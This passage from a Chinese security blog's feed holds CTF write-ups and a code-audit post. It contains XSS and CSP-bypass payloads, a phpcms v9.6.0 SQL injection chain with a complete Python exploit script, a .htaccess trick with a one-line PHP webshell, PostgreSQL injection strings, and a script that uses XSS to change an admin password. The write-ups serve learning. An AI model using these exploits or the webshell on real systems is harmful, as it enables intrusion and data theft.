nonce="A7Vlkv32ZI2g"&gt;console.log('bad boy!!')&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>这样的形式，吃掉了 script 开始的标签，这样就绕过了 nonce 的限制<br>然后还有第二种方式，也是最简单的一种方式，看下admin目录下的 csp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;; script-src &apos;nonce-A7Vlkv32ZI2g&apos;;</span><br></pre></td></tr></table></figure></p><p>可以构造一个 iframe 标签，这样就不用跨域了，可以直接读到 flag 的内容<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://52.80.63.91/adminshigesha233e3333/#&lt;iframe src=&quot;./flag.php&quot;&gt; &quot;</span><br></pre></td></tr></table></figure></p><p>最后也是最正确的解法是利用浏览器的缓存，我们可以在 csp 头中看到 script-src 只有 nonce 值符合才会允许执行，但是浏览器每次刷新 nonce 值都会变化，当时就想的是请求一次获取 nonce 值后，下次再访问不就变了吗，一直百思不得其解，怎么通过构造 nonce 值做出来，直到看到官方 wp，才知道是利用了浏览器的缓存机制，所以 csp 头一段时间(30s)内不会变，所以就可以通过构造 nonce 值的 script 标签执行 js 了。</p><p>最后，无论是哪种方式，因为 admin 目录页面是禁止发跨域请求的，要想得到它的输出，可以通过留言的方式，找到了 /api/addmessage.php，用 xhr 发送请求就可以了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一道土师傅出的 xss 的题，因为一些细节没理解，没做出来，不过还是学到了挺多知识的。&lt;/p&gt;
&lt;p&gt;打开页面，是一个留言板，有注册和登录功能，因为已经说了有 bot ，就不考虑 sql 注入的问题了。随便注册个账号登录进去可以发现是一个留言的功能，给自己留言得到 &lt;cod
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>phpcms v9.6.0 sql injection under files download</title>
    <link href="http://heartsky.info/2017/04/10/phpcms-v9-6-0-sql-injection-under-files-download/"/>
    <id>http://heartsky.info/2017/04/10/phpcms-v9-6-0-sql-injection-under-files-download/</id>
    <published>2017-04-10T09:33:22.000Z</published>
    <updated>2018-10-26T06:08:42.429Z</updated>
    
    <content type="html"><![CDATA[<p>一早起来就看到群里在传 phpcms 的洞,于是自己也去看了下,因为自己也是刚入门代码审计,所以会尽量讲的详细一点</p><h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>PHPCMS V9（后面简称V9）采用PHP5+MYSQL做为技术基础进行开发。V9采用OOP（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，优秀的二次开发能力，可满足所有网站的应用需求。 5年开发经验的优秀团队，在掌握了丰富的WEB开发经验和CMS产品开发经验的同时，勇于创新追求完美的设计理念，为全球多达10万网站提供助力，并被更多的政府机构、教育机构、事业单位、商业企业、个人站长所认可。 </p><p>去官网看了下,貌似最后一次更新是在 2015 年 ==</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞开始"><a href="#漏洞开始" class="headerlink" title="漏洞开始"></a>漏洞开始</h4><p>phpcms/modules/admin/index.php 下的 swfupload_json 函数<br><img src="http://heartsky.info/images/image/phpcms_v9.6.0_sqli_1.png" alt=""><br>我们可以看到 241 行提交的 src 变量经过了 safe_replace 函数,猜测是一个过滤关键字的函数,我们跟进它来看下</p><h4 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h4><p>phpcms/libs/functions/global.func.php 下的 safe_replace 函数<br><img src="http://heartsky.info/images/image/phpcms_v9.6.0_sqli_2.png" alt=""><br>哇 兴奋至极,关键字替换为空的过滤都是假老虎!<br>我们可以看到对单引号 url 编码后的 %27 以及二次编码后的 %2527 都进行了替换,其实我们只要用 %*27 或 %;27 就可以绕过了,首先匹配单引号及其 url 编码,这时候是匹配不到的,下面匹配到 * 或者 ; 的时候替换为空,成功构造 %27,这样我们就可以闭合 sql语句(如果有的话) 的单引号了</p><p>我们知道在 swfupload_json 函数里创建了一个 xxx_att_json 的 cookie,下面我们就来找下哪个地方用到了这个 cookie</p><h4 id="变量传递"><a href="#变量传递" class="headerlink" title="变量传递"></a>变量传递</h4><p>phpcms/modules/content/down.php 下的 init 函数<br><img src="http://heartsky.info/images/image/phpcms_v9.6.0_sqli_3.png" alt=""><br>我们注意到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</span><br></pre></td></tr></table></figure></p><p>经过把生成的 xxx_att_json 的值赋值给$a_k,发现得到下面的值 {“aid”:1,”src”:”2”,”filename”:”3”}<br>也就是说这一步是对 json 进行解码</p><p>值得注意的是下面的 parse_str 函数,经过查询,得知此函数的功能是将字符串解析成多个变量,以 &amp; 分隔,然后下面还有一个 sql 查询语句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br></pre></td></tr></table></figure></p><p>变量 id 当 变量 i 不存在时它也是不存在的<br>safe_replace 函数没有对 &amp; 及其 URL 编码进行过滤,如果我们用 &amp; 进行分隔,<code>&quot;src&quot;:&quot;1&amp;id=2&quot;</code>,这样就可以成功解析出变量 i 了。第 19、20、21行要求变量 m、modelid、catid 以及 f 存在，和上面类似，只要用 &amp; 分隔，就可以成功解析出相关变量了。进入 sql 查询，id 用报错注入即可成功实现注入</p><h3 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h3><ul><li><p>身份认证<br>请求 /index.php?m=wap&amp;a=index 得到 cookie 里的 xxxxx_siteid</p></li><li><p>获取 json 数据<br>带着上面的 cookie 和自己生成的名为 xxxxx__userid 的 cookie(和上一个 cookie 的值相同)请求 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml(1,concat(0x7e,(database())),1)%23%26m=1%26f=2%26modelid=3%26catid=6&amp;filename=3，得到 json 数据</p></li><li><p>注入<br>请求 /index.php?m=content&amp;c=down&amp;a=init&amp;a_k=[json数据]<br><img src="http://heartsky.info/images/image/phpcms_v9.6.0_sqli_4.png" alt=""><br>顺便打印出来 json 数据 <code>{&quot;aid&quot;:1,&quot;src&quot;:&quot;&amp;id=%27 and updatexml(1,concat(0x7e,(user())),1)#&amp;m=1&amp;f=wobushou&amp;modelid=2&amp;catid=6&quot;,&quot;filename&quot;:&quot;&quot;}</code><br>这下应该更容易明白了，parse_str函数操作的就是上面的字符串，以 &amp; 分隔来解析变量，下面用于查询的 id 就是 <code>%27 and updatexml(1,concat(0x7e,(user())),1)#</code></p></li></ul><p>附一份别人的 exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,sys,urllib</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Phpcms v9.6.0 SQLi Exploit Code By Luan'</span></span><br><span class="line">sqli_prefix = <span class="string">'%*27 and'</span></span><br><span class="line">sqli_info = <span class="string">' updatexml(1,concat(0x7e,(user())),1)'</span> </span><br><span class="line">sqli_padding = <span class="string">'%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6'</span></span><br><span class="line">setp1 = url + <span class="string">'/index.php?m=wap&amp;a=index'</span></span><br><span class="line">cookies = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> requests.get(setp1).cookies:</span><br><span class="line">    <span class="keyword">if</span> c.name[<span class="number">-7</span>:] == <span class="string">'_siteid'</span>:</span><br><span class="line">        cookie_head = c.name[:<span class="number">6</span>]</span><br><span class="line">        cookies[cookie_head+<span class="string">'_userid'</span>] = c.value</span><br><span class="line">        cookies[c.name] = c.value</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] Get Cookie : '</span> + str(cookies)</span><br><span class="line"></span><br><span class="line">setp2 = url + <span class="string">'/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id='</span> + sqli_prefix + urllib.quote_plus(sqli_info, safe=<span class="string">'qwertyuiopasdfghjklzxcvbnm*'</span>) + sqli_padding</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> requests.get(setp2,cookies=cookies).cookies:</span><br><span class="line">    <span class="keyword">if</span> c.name[<span class="number">-9</span>:] == <span class="string">'_att_json'</span>:</span><br><span class="line">        <span class="keyword">print</span> c.value</span><br><span class="line">        sqli_payload = c.value</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] Get SQLi Payload : '</span> + sqli_payload</span><br><span class="line"></span><br><span class="line">setp3 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</span><br><span class="line">html = requests.get(setp3,cookies=cookies).content</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] Get SQLi Output : '</span> + str(html.split(<span class="string">'&lt;br /&gt;'</span>)[<span class="number">1</span>])</span><br><span class="line">table_prefix = html[html.find(<span class="string">'_download_data'</span>)<span class="number">-2</span>:html.find(<span class="string">'_download_data'</span>)]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] Get Table Prefix : '</span> + table_prefix</span><br></pre></td></tr></table></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们可以看出问题的关键在于两个地方，一个是过滤函数的问题，修补建议为对关键字的过滤不要替换为空，可以改成 <code>_</code> 之类的，另一个是 parse_str 这个函数要合理使用，使用不当会造成问题</p><p>听说还有一个任意文件上传的漏洞?</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一早起来就看到群里在传 phpcms 的洞,于是自己也去看了下,因为自己也是刚入门代码审计,所以会尽量讲的详细一点&lt;/p&gt;
&lt;h3 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h3&gt;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://heartsky.info/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>VolgaCTF DoubleS1405 Securinets 部分题 wp</title>
    <link href="http://heartsky.info/2017/03/29/VolgaCTF-DoubleS1405-Securinets-%E9%83%A8%E5%88%86%E9%A2%98-wp/"/>
    <id>http://heartsky.info/2017/03/29/VolgaCTF-DoubleS1405-Securinets-部分题-wp/</id>
    <published>2017-03-29T04:57:35.000Z</published>
    <updated>2018-10-26T06:08:42.428Z</updated>
    
    <content type="html"><![CDATA[<p>上周末出去浪了一天多。等回来时发现有三个比赛，看题目时便都快结束了，挑着几道还可以的做了下，有些太脑洞直接跳过了 = = </p><h2 id="VolgaCTF-Web"><a href="#VolgaCTF-Web" class="headerlink" title="VolgaCTF - Web"></a><a href="https://quals.2017.volgactf.ru" target="_blank" rel="external">VolgaCTF</a> - Web</h2><h3 id="VC-50-pts"><a href="#VC-50-pts" class="headerlink" title="VC - 50 pts"></a>VC - 50 pts</h3><blockquote><p>There are files A.png and B.png. But where’s the flag?</p></blockquote><p>题目给了两张图片，自然而然的想到异或，直接丢到 stegsolve 里异或下就出来了</p><h3 id="Share-Point-200-pts"><a href="#Share-Point-200-pts" class="headerlink" title="Share Point - 200 pts"></a>Share Point - 200 pts</h3><blockquote><p>Look! I wrote a good service for sharing your files with your friends, enjoy)<br><a href="http://share-point.quals.2017.volgactf.ru" target="_blank" rel="external">http://share-point.quals.2017.volgactf.ru</a></p></blockquote><p>没有注册功能，可以任意登录。登陆之后可以上传文件和分享文件，测试了下只检测了文件后缀名，而且是黑名单，但是常见的后缀包括 php3、phtml、pht 什么的都不行。注意到一个细节，上传的文件被保存在了 <code>/files/username/</code> 下，那么这里就有一个利用姿势。正好是前几天在 <a href="http://paper.seebug.org/92/" target="_blank" rel="external">seebug</a> 上看到的，如果我们上传一个 .htaccess 文件，让它把我们自定义的一个文件解析为 php，那么就可以了</p><p>.htaccess<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch “test.jpg”&gt;  </span><br><span class="line">SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure></p><p>或者直接让它解析 jpg 这个后缀<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure></p><p>然后上传一个 WebShell<br>233.jpg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>最后 flag 的位置有点没想到，在 /opt 目录下，记得上次国科大的线下赛 flag 也是在这个目录下，难道有什么不为人知的交易？</p><h3 id="Bloody-Feedback-100-pts"><a href="#Bloody-Feedback-100-pts" class="headerlink" title="Bloody Feedback - 100 pts"></a>Bloody Feedback - 100 pts</h3><blockquote><p>Bloody Feedback<br>Send your feedback at <a href="http://bloody-feedback.quals.2017.volgactf.ru" target="_blank" rel="external">http://bloody-feedback.quals.2017.volgactf.ru</a><br>DO. NOT. USE. SQLMAP<br>Otherwise your IP will be banned</p></blockquote><p>题目说不让用 sqlmap，那就是 sql 注入咯<br>进去看一下，可以提交一个反馈，会返回这样的 <code>T4XRn8Q11kXSHmNILgD9LzT3AKOcrPRS</code> 一个消息的标志，并且在 get 参数中，起初以为是这里有注入，结果发现怎么样都不行，而且查询不到指定的消息时返回的都是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Wrong code at Worker.pm line 62.</span><br></pre></td></tr></table></figure></p><p>据说可以看出是 perl 脚本，反正我没看出来<br>那么注入点应该不在这里，回到表单，测试之后发现了 email 处有猫腻(除了 email 的其他地方输入都被转义了)，当我提交一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;;echo &apos;233</span><br></pre></td></tr></table></figure></p><p>的时候，返回了这样一个错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: DBD::Pg::db do failed: ERROR: syntax error at or near &quot;echo&quot; LINE 1: ...(&apos;OVYZYOD8wYDgmm89n6BGqNxbp23mY5hP&apos;,&apos;333&apos;,&apos;sad&apos;,&apos;&apos;echo &apos;233&apos;... ^ at Worker.pm line 29.</span><br></pre></td></tr></table></figure></p><p>这应该是一个数据库中的插入语句，搜了下是 PostgreSQL 数据库，然后这里是 insert 语句，继续尝试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;);--</span><br><span class="line">ERROR: DBD::Pg::db do failed: ERROR:  INSERT has more target columns than expressions</span><br><span class="line">LINE 1: INSERT INTO messages (code,name,message,email,status) VALUES... ^ at Worker.pm line 29.</span><br></pre></td></tr></table></figure></p><p>知道了后台怎么写的后，我们就可以构造我们的注入语句了<br>获取数据库名(pg_database 表存储了所有的数据库信息)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;,(select datname from pg_database limit 1 offset 3));--</span><br><span class="line">feedback_db</span><br></pre></td></tr></table></figure></p><p>表名(pg_tables 表存储了所有的表信息)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;,(select tablename from pg_tables limit 1 offset 0));--</span><br><span class="line">messages s3cret_tabl3</span><br></pre></td></tr></table></figure></p><p>s3cret_tabl3 表名的 oid(因为 pg_class.oid 对应 pg_attribute.attrelid，所以我们可以获取目标表的 oid，然后在 pg_attribute 表中得到 attname 的值，即为列名)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;,(select oid from pg_class where relname like &apos;s3cret_tabl3&apos; limit 1 offset 0));--</span><br><span class="line">16435</span><br></pre></td></tr></table></figure></p><p>列名(pg_attribute 存储了所有的列信息；直接用 attrelid 时提示 <code>没有匹配指定名称和参数类型的操作符. 您也许需要增加明确的类型转换</code>，用 cast 把前面的转换为字符串类型就可以了)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;,(select attname from pg_attribute where cast(attrelid as varchar(15)) like </span><br><span class="line">&apos;16435&apos;limit 1 offset 0));--</span><br><span class="line">s3cr3tc0lumn</span><br></pre></td></tr></table></figure></p><p>获取数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email=&apos;,(select s3cr3tc0lumn from s3cret_tabl3 limit 1 offset 4));--</span><br><span class="line">VolgaCTF&#123;eiU7UJhyeu@ud3*&#125;</span><br></pre></td></tr></table></figure></p><p>注意：</p><ol><li>where 好像被 ban 了，可以用 like 来代替</li><li>也可以不用 pg 中特殊的系统表，采用 information_schema.tables，和 MySQL 中的用法是一模一样的，只是有一个小问题，在 PostgreSQL 中，information_schema 并非一个真正的数据库，如果在 test 数据库中新建一个 test 表，进入其他数据库，然后 <code>select table_name from information_schema.tables;</code> 是查询不到 test 这个表的。所以如果 flag 在另一个数据库的话就只能用 pg 中的特殊类表了</li></ol><p>这题还是可以的，学到了基本的 PostgreSQL 注入知识</p><h3 id="Sneaky-Tags-300-pts"><a href="#Sneaky-Tags-300-pts" class="headerlink" title="Sneaky Tags - 300 pts"></a>Sneaky Tags - 300 pts</h3><blockquote><p>We created a great service for you (Alpha version, work in progress), don’t hesitate to use it.<br>administrator is hiding something in his tags<br><a href="http://sneaky-tags.quals.2017.volgactf.ru:8080" target="_blank" rel="external">http://sneaky-tags.quals.2017.volgactf.ru:8080</a></p></blockquote><p>目标是获得 administrator 的 tags，进去后发现又是没有注册，只有登录界面，除了 administrator 的会验证密码，其他用户都可以随意登入，然后习惯性的试了 123，结果直接看到了别人留下的做题记录，拿到了 flag……</p><p>好吧，还是分析下<br>登陆进去后有三个功能，分别是创建标签、同步标签到推特、搜索某标签是否同步到了推特，测试下发现创建标签处不存在 xss，想下应该不是真正的推送到推特，而是插入到自己的数据库中，但正常的插入我这都不成功，转向搜索功能，结合 js，这里应该是一个 <code>select * from xxx where xxxxx = tag</code> 这样的语句，如果我们在创建标签的时候就构造恶意语句的话……</p><p>还没来得及测试环境就关了……</p><h3 id="Corp-News-300-pts"><a href="#Corp-News-300-pts" class="headerlink" title="Corp News - 300 pts"></a>Corp News - 300 pts</h3><blockquote><p>We have created an excellent service for obtaining corporate news. You never know the secret information<br><a href="http://corp-news.quals.2017.volgactf.ru" target="_blank" rel="external">http://corp-news.quals.2017.volgactf.ru</a><br><a href="http://corp-news2.quals.2017.volgactf.ru" target="_blank" rel="external">http://corp-news2.quals.2017.volgactf.ru</a><br>Hints<br>Some errors may shed light on what is there on the backend</p></blockquote><p>打开后又是登录时直接注册的页面，比较坑的是密码的要求给的是 <code>[a-zA-Zd]{7,}</code>，一直说不符合要求，结果原来是大小写数字都要有 ==</p><p>进入后有这么几个功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">change_password 修改密码(有csrf保护)</span><br><span class="line">feedback 提交评论</span><br><span class="line">news 查看私密新闻</span><br></pre></td></tr></table></figure></p><p>其中查看新闻这个功能 post 了一个这样的 <code>{&quot;resultFormat&quot;:&quot;text&quot;}</code> json数据，返回的是 <code>{&quot;Status&quot;:&quot;OK&quot;,&quot;message&quot;:&quot;Please, set debug header true, becouse the app in developing state:)&quot;}</code>，尝试把 resultFormat 的值改为其他的，结果返回的都是这样 <code>{&quot;status&quot;:500,&quot;message&quot;:&quot;`result_format` (texsdfsdft) is not recognized, (&#39;auto&#39;, &#39;json&#39;, &#39;jsonp&#39;, &#39;text&#39;, and &#39;binary&#39; are allowed).&quot;}</code>，感觉这里是有问题的，于是搜了下 <code>result_format  and options</code>，找到一篇<a href="https://rethinkdb.com/api/python/http/" target="_blank" rel="external">文章</a>。应该是 RethinkDB 这个数据库的语法，看到可以构造 header 头，于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request</span><br><span class="line">&#123;&quot;resultFormat&quot;:&quot;text&quot;,&quot;header&quot;:&#123;&quot;debug&quot;:&quot;true&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">response</span><br><span class="line">&#123;&quot;Status&quot;:&quot;OK&quot;,&quot;message&quot;:&quot;VolgaCTF is an international inter-university cybersecurity competition organised by a group of IT enthusiasts based in Samara, Russia.VolgaCTF 2017 Quals is an online competition. Top teams will be invited to participate in VolgaCTF 2017 Finals, which will be held in Samara, Russia.Registration for the competition will be opened at the end of February.&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>现在可以看新闻了，但是并没有什么用<br>应该是可以看到管理员的名字的，结合修改密码功能，猜测可以发送留言来修改管理员的密码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(<span class="string">"GET"</span>, <span class="string">"/lk"</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            text = xhr.responseText;</span><br><span class="line">            text = text.substr(text.indexOf(<span class="string">'invisible"&gt;'</span>) + <span class="string">'invisible"&gt;'</span>.length);</span><br><span class="line">            csrf = text.substr(<span class="number">0</span>, text.indexOf(<span class="string">'&lt;/p&gt;'</span>));</span><br><span class="line">            data = <span class="built_in">JSON</span>.stringify(&#123;<span class="string">'new_password'</span>:<span class="string">'aaaAAA11'</span>,<span class="attr">confirm_password</span>:<span class="string">'aaaAAA11'</span>,<span class="string">'token'</span>:csrf&#125;);</span><br><span class="line">            xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            xhr2.open(<span class="string">"POST"</span>, <span class="string">"/change_password"</span>, <span class="literal">true</span>);</span><br><span class="line">            xhr2.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/json"</span>);</span><br><span class="line">            xhr2.send(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>登陆上去后会有一条信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Secret header: asdJHF7dsJF65$FKFJjfjd773ehd5fjsdf7</span><br></pre></td></tr></table></figure></p><p>然后用前面的方式构造头就可以拿到 flag 了</p><h2 id="VolgaCTF-Crypto"><a href="#VolgaCTF-Crypto" class="headerlink" title="VolgaCTF - Crypto"></a><a href="https://quals.2017.volgactf.ru" target="_blank" rel="external">VolgaCTF</a> - Crypto</h2><h3 id="Curved-200-pts"><a href="#Curved-200-pts" class="headerlink" title="Curved - 200 pts"></a>Curved - 200 pts</h3><blockquote><p>This server is willing to perform several commands and cat is among them. However, to execute cat flag we need to provide the signature. We only have signatures for exit and leave commands which is cruelly ironic. Can you help us to get the flag?<br>curved_server.py<br>exit.sig<br>key.public<br>leave.sig<br>curved.quals.2017.volgactf.ru:8786</p></blockquote><p>这道题是 ECDSA(椭圆曲线数字签名算法)，我们有 <code>exit</code> 和 <code>leave</code> 的数字签名，要计算出 <code>cat flag</code> 的数字签名，和之前的数论基础题有点像</p><p><del>简单的说一下这个算法的步骤</del>懒得写了，直接贴下<a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm" target="_blank" rel="external">维基百科</a>的<br><img src="http://heartsky.info/images/image/VolgaCTF_DoubleS1405_Securinets.png" alt=""><br>所以当 r、d 相同，有两组数字签名数据时是可以恢复 k、d 的，然后就可以生成我们想要信息的数字签名了<br>附关键代码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    r = <span class="number">9540946282644423304958237178123966732301592745413906651991128246584667628620778601005222874778554839816137094172414</span></span><br><span class="line">    curve = G.curve</span><br><span class="line">    n = curve.n</span><br><span class="line">    Ln = bit_length(n)</span><br><span class="line">    cmd1 = <span class="string">'exit'</span></span><br><span class="line">    cmd2 = <span class="string">'leave'</span></span><br><span class="line">    z1 = int(hashlib.sha512(cmd1).hexdigest(), <span class="number">16</span>) &gt;&gt; <span class="number">512</span> - Ln</span><br><span class="line">    z2 = int(hashlib.sha512(cmd2).hexdigest(), <span class="number">16</span>) &gt;&gt; <span class="number">512</span> - Ln</span><br><span class="line">    (r1, s1) = import_cmd_signature(cmd1, <span class="string">'.'</span>)</span><br><span class="line">    (r2, s2) = import_cmd_signature(cmd2, <span class="string">'.'</span>)</span><br><span class="line">    k = (z1 - z2) * invert(s1 - s2, n) % n</span><br><span class="line">    d = int(((s1 * k - z1 % n) * invert(r, n)) % n)</span><br><span class="line">    signature = ECDSA(G, d)</span><br><span class="line">    cmd = <span class="string">'cat flag'</span></span><br><span class="line">    r, s = signature.sign(cmd)</span><br><span class="line">    <span class="keyword">print</span> r</span><br><span class="line">    <span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></p><h2 id="DoubleS1405-2nd-CTF-Web"><a href="#DoubleS1405-2nd-CTF-Web" class="headerlink" title="DoubleS1405 2nd CTF - Web"></a><a href="http://doubles1405.com/" target="_blank" rel="external">DoubleS1405 2nd CTF</a> - Web</h2><h3 id="blackout-50-pts"><a href="#blackout-50-pts" class="headerlink" title="blackout - 50 pts"></a>blackout - 50 pts</h3><p>看题目名字就知道了，blackout-停电，进去一看果然什么也没有，那就是备份文件喽，是.index.php.swp，然后 strings 一下就找到了<br>Tips: .xxx.swp 是在用 vim 编辑的时候在还未保存的情况下，电脑断电或者 vim 发生异常退出时的缓冲区备份文件</p><h3 id="iterator-100-pts"><a href="#iterator-100-pts" class="headerlink" title="iterator - 100 pts"></a>iterator - 100 pts</h3><p>打开就是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$directory = $_GET[<span class="string">'dir'</span>];</span><br><span class="line">$cond = explode(<span class="string">"="</span>, urldecode($_SERVER[<span 